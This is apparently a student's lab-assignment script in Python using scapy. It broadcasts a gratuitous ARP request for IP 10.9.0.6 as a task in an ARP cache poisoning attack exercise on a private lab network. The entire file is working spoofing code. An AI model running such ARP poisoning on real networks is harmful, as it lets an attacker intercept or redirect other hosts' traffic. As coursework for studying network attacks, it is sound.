#!/usr/bin/python3
from scapy.all import *
print("CMPE209-Assignment1-016707314-ARP Cache Poisoning Attack - Task1C- Using ARP Gratuitous Message - B's IP is not in A's cache");

E = Ether(dst='ff:ff:ff:ff:ff:ff')
A = ARP(op=1, psrc='10.9.0.6', pdst='10.9.0.6', hwdst='ff:ff:ff:ff:ff:ff')

pkt = E/A
pkt.show()
sendp(pkt)
